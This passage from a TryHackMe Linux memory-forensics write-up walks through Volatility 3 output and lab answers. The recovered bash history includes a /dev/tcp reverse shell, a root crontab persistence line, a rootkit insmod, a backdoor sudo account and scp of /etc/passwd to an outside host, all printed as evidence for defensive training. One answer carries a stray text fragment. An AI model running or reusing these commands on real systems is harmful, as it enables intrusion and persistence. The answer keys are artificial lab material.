Examine the network connections and see if you can find any suspicious connections and associated processes.</p>

</p>

<h3 align="left"> Answer the questions below</h3>

> 6.1. <em>What is the IP address of the remote server, to which a TCP connection was established using python?</em><br><a id='6.1'></a>
>> <strong><code>10.100.1.125</code></strong><br>
<p></p>

![image](https://github.com/user-attachments/assets/ed8dabb3-a88f-4f3f-b51a-859ff33c3afc)


<br>

> 6.2. <em>What was the IP address of the infected host found in the record?</em><br><a id='6.2'></a>
>> <strong><code>10.10.163.215head socket_outp</code></strong><br>
<p></p>

![image](https://github.com/user-attachments/assets/94047dc4-3813-4555-8325-adfd0f10b935)


<br>

> 6.3. <em>What is the MAC address of the network interface associated with the infected device?</em><br><a id='6.3'></a>
>> <strong><code>02:83:88:6b:5a:1f</code></strong><br>
<p></p>

![image](https://github.com/user-attachments/assets/03eabeff-e069-42d6-9a10-846e9f8a4df3)

<br>

> 6.4. <em>What is the port number opened for the reverse shell by the adversary on the infected host?</em><br><a id='6.4'></a>
>> <strong><code>9898</code></strong><br>
<p></p>

![image](https://github.com/user-attachments/assets/bd7d3846-cfe7-4e0d-9435-79b3a06a9e3a)

<br>

<h2> Task 7 . Hunting for User Activities</h2>
<p>When a system is compromised, attackers typically interact with it through command-line tools like bash, sh, or python. Their footprints are often left behind in memory long after processes have terminated. By analyzing shell history, terminal usage, and related metadata, we can reconstruct what commands were run, by whom, and in what context.</p>

<h3>Bash History</h3>

<p>We can use the following command to locate the footprints of the command history from users’ Bash sessions (.bash_history or in-memory structures), offering direct insight into what actions a user performed.<br><br>

Command: vol3 -f FS-01.mem linux.bash.Bash</p>

<p>Bash History</p>

```bash
ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.bash.Bash
Volatility 3 Framework 2.26.2
PID    Process    CommandTime    Command
14165    bash    2025-06-02 10:12:47.000000 UTC    useradd [REDACTED] -m -s /bin/bash
14165    bash    2025-06-02 10:13:07.000000 UTC    /sbin/useradd [REDACTED] -m -s /bin/bash
14165    bash    2025-06-02 10:13:10.000000 UTC    sudo su
14204    bash    2025-06-02 10:13:35.000000 UTC    /sbin/useradd [REDACTED] -m -s /bin/bash
14204    bash    2025-06-02 10:14:19.000000 UTC    echo '[REDACTED]secretP2ssw0rd!' | chpasswd
14204    bash    2025-06-02 10:14:33.000000 UTC    usermod -aG sudo [REDACTED]
14204    bash    2025-06-02 10:15:02.000000 UTC    mkdir /home/[REDACTED]/.ssh
14204    bash    2025-06-02 10:15:53.000000 UTC    sudo su - [REDACTED]
14204    bash    2025-06-02 10:34:33.000000 UTC    bash -i >& /dev/tcp/10.12.14.32/4567 0>&1
14204    bash    2025-06-02 10:51:34.000000 UTC    mkdir /tmp
14204    bash    2025-06-02 10:51:41.000000 UTC    cd /tmp/
14204    bash    2025-06-02 10:51:42.000000 UTC    ls
14801    bash    2025-06-02 10:36:23.000000 UTC    sudo su
14801    bash    2025-06-02 10:36:23.000000 UTC    Pf[
14847    bash    2025-06-02 10:36:27.000000 UTC    echo "* * * * * root bash -i >& /dev/tcp/10.12.14.32/4567 0>&1" >> /etc/crontab
14847    bash    2025-06-02 10:37:02.000000 UTC    isnmod rootkit.ko
14847    bash    2025-06-02 10:37:11.000000 UTC    insmod rootkit.ko
14847    bash    2025-06-02 10:39:46.000000 UTC    chmod +x /dev/shm/.runme.sh
14847    bash    2025-06-02 10:39:51.000000 UTC    /dev/shm/.runme.sh
14847    bash    2025-06-02 10:41:17.000000 UTC    scp /etc/passwd root@10.10.34.91:/home/
```


<p>The command's output is already placed in the bash_output file. The output shows the commands the user ran in the bash terminal. Some of the suspicious commands executed were related to suspicious account creation, SSH setup, setting up a cron job, etc.</p>

<h5>Forensic Value</h5>

<p>

- Reveals attacker behavior in plaintext.<br>
- Identifies credential theft, persistence mechanisms, and payload execution.<br>
- Even if history is wiped from disk, memory can preserve it.</p>

<h3>Check Environment Variables</h3>

<p>We can also extract the traces of the environment variables from the memory. This may be useful if the attacker has planted suspicious binaries in a custom location and altered the PATH variable to prioritize the execution.<br><br>

Command: vol3 -f FS-01.mem linux.envars.Envars</p>

<p>Checking Environment Variables</p>

```bash
ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.envars.Envars
Volatility 3 Framework 2.26.2
PID    PPID    COMM    KEY    VALUE
1    0    systemd    HOME    /
1    0    systemd    TERM    linux
1    0    systemd    BOOT_IMAGE    /boot/vmlinuz-5.15.0-1066-aws
170    1    systemd-journal    LANG    C.UTF-8
170    1    systemd-journal    PATH    /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
170    1    systemd-journal    NOTIFY_SOCKET    /run/systemd/notify
```

<p>The command's output is already placed in the envars_output file.</p>

<h5>Forensics Value:</h5>

- Reveals execution context of processes, including directories, shells, and user settings.<br>
- Detects malicious environment manipulation, such as modified PATH.<br>
- Uncovers persistence mechanisms through environment-based startup configurations.<br>
- Correlates with other process artifacts to enrich the investigation context.</p>

<p>In conclusion, understanding user behavior is critical for identifying unauthorized access, malicious actions, and post-exploitation traces.</p>

<h3 align="left"> Answer the questions below</h3>

> 7.1. <em>The network team has detected a suspicious attempt to create a new account on the system. Can you investigate and find the name of the backdoor account created?</em><br><a id='7.1'></a>
>> <strong><code>james</code></strong><br>
<p></p>

![image](https://github.com/user-attachments/assets/606993b9-2a94-44fd-95ce-a9c3af4bae39)


<br>

> 7.2. <em>The bash history shows a suspicious command that established a reverse shell. What is the attacker's IP address?</em><br><a id='7.2'></a>
>> <strong><code>10.12.14.32</code></strong><br>
<p></p>

![image](https://github.com/user-attachments/assets/2dda16cd-6ed5-46e8-bbae-ae2f9298120e)

<br>

<h2> Task 8 . Conclusion</h2>

<p>That's it.<br><br>

In this room, we examined a Linux memory dump to look for the footprints of the adversary on the compromised Linux host. Some of the key points we covered are:<br><br>

- Identify suspicious process.<br>
- Identify the hidden process running from the tmp directory.<br>
- Examine the processes with suspicious arguments.<br>
- Examine the bash history.<br>
- Explore network connections and identify reverse shell connections.</p>

<p>You can learn more about forensics in the following rooms:<br>

- Linux Logs Investigation<br>
- Linux Process Analysis<br>
- Linux Forensics</p>

<p>Happy Learning!</p>

<h3 align="left"> Answer the questions below</h3>

> 8.1. <em>Continue to complete the room.</em><br><a id='8.1'></a>
>> <strong><code>No answer needed</code></strong><br>
<p></p>

<br>

> 8.2. <em>Don't forget to close the machine attached to the room.</em><br><a id='8.2'></a>
>> <strong><code>No answer needed</code></strong><br>
<p></p>

<br>
<br>

<h1 align="center">Room Completed</h1>
<br>
<p align="center"><img width="1000px" src="https://github.com/user-attachments/assets/beaddb75-5e0b-4895-8234-0e44d4530494"><br>
                  <img width="1000px" src="https://github.com/user-attachments/assets/971d6144-b86a-4547-8999-7fe5d94a9742"></p>

<h1 align="center"> My TryHackMe Journey</h1>
<br>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| June 12 2025      | 402      |     202nd    |      4ᵗʰ     |     461ˢᵗ   |     9ᵗʰ    |  107,529  |    776    |     62    |

</div>

<p align="center"> Global All Time:  202nd<br><br>
<img width="240px" src="https://github.com/user-attachments/assets/880c185a-d1d4-48a9-9932-0163cc0dab53"><br>
<img width="1000px" src="https://github.com/user-attachments/assets/40d0a27d-9c31-4374-b075-b433ad4a2e2d"> </p>

<p align="center"> Brazil All Time:    4ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/f355553c-c889-4ec8-b123-8f58de4609f9"> </p>
"> </p>

<p align="center"> Global monthly:    721ˢᵗ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/b643d2ce-410d-4b6c-a158-da90efd51753"> </p>

<p align="center"> Brazil monthly:    15ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/1e310a7b-eb22-4cd0-8846-8d43debcf7e7"> </p>

<h1 align="center">Thanks for coming!!!</h1>

<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 

<h1 align="center">Thank you</h1>
<p align="center"><a href="https://tryhackme.com/p/Dex01">Dex01</a>  for investing your time and effort to develop this challenge so that I could sharpen my skills!</p> 
